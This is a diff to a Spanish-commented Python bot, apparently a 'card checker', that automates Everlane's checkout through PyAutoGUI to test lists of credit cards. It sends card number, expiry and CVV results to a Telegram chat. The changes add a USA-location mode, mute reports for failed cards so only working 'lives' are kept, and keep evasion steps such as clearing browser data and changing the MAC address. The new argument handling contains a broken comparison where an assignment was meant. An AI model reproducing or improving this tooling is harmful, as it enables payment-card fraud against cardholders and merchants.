@@ -1,5 +1,5 @@
 ### Hecho el 02/08/2008 por SyntaxErr0r ###
-import random
+import random, argparse
 from pg_bot import PyAutoGUI_Bot
 from funciones import generar_identidad, telegram, separar_cc, listar_cc
 
@@ -10,7 +10,7 @@ url = 'https://www.everlane.com/products/unisex-diamond-stitch-sock-lavender'
 
 # Funciones
 
-def preparar_worksplace():
+def preparar_worksplace(out_usa):
 
     if bot.locate('everlane', click=False) == True or bot.locate('payment_method') == True: 
         print('Usando el entorno de trabajo actual')    
@@ -37,18 +37,20 @@ def preparar_worksplace():
 
         # Verificamos si estamos en USA
 
-        # if bot.locate('usd', wait=1, click=False):
-        #     pass
+        if out_usa == True:
 
-        # else: 
-        #     bot.move(1287, 91, click=True)
-        #     bot.locate('select_your_location', check=True)
-        #     bot.pause(0.2)
-        #     bot.press('end')
-        #     bot.locate('north_america', wait=0.1)
-        #     bot.press('end')
-        #     bot.locate('united_states', wait=0.1)
-        #     bot.locate('accept', wait=0.1)
+            if bot.locate('usd', wait=1, click=False):
+                pass
+
+            else: 
+                bot.move(1287, 91, click=True)
+                bot.locate('select_your_location', check=True)
+                bot.pause(0.2)
+                bot.press('end')
+                bot.locate('north_america', wait=0.1)
+                bot.press('end')
+                bot.locate('united_states', wait=0.1)
+                bot.locate('accept', wait=0.1)
 
         # Ponemos una pausa por si encontramos cualquier popup o descuento
         bot.pause(2)
@@ -120,7 +122,7 @@ def preparar_worksplace():
         bot.pause(0.20)
         bot.scroll(-500)
 
-def livear(cc_namso, current, total):
+def livear(cc_namso, current, total, out_usa):
     print(f"Current: {cc_namso}")
     cc = separar_cc(cc_namso)
 
@@ -225,7 +227,7 @@ def livear(cc_namso, current, total):
             bot.pause(0.10)
             bot.press_both('alt', 'f4')
 
-            preparar_worksplace()
+            preparar_worksplace(out_usa)
             break
 
         elif bot.locate('error1', click=False):
@@ -233,14 +235,17 @@ def livear(cc_namso, current, total):
             telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
             break
 
+        # Solo queremos las lives asi que comentamos los telegram de las siguientes condiciones
+
         elif bot.locate('out_funds', click=False):
             print('Your card appears to be out of funds. Please try a new one.')
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
             break
 
         elif bot.locate('unable_to_add', click=False):
             print("Unable to add payment method. Please try again.")
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
+
+            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
 
             bot.press_both('ctrl', 'l')
             bot.copypaste('chrome://settings/clearBrowserData')
@@ -249,6 +254,9 @@ def livear(cc_namso, current, total):
             bot.pause(0.10)
             bot.press_both('alt', 'f4')
             bot.pause(0.5)
+
+            # Por el problema del VPN, vamos a cortar todo hasta aqui y trabajarlo manual
+            quit()
 
             # CAMBIAMOS MAC
 
@@ -277,7 +285,16 @@ def livear(cc_namso, current, total):
 
 def main():
 
-    preparar_worksplace()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-mode', '-m', type=str)
+    args = parser.parse_args()
+
+    out_usa = False
+
+    if args.mode == 'other':
+        out_usa == True
+
+    preparar_worksplace(out_usa)
 
     cc_for_use = listar_cc()
 
@@ -286,7 +303,7 @@ def main():
 
     for cc in cc_for_use:
         
-        livear(cc, current, total)
+        livear(cc, current, total, out_usa)
         current += 1
         
 if __name__ == '__main__':
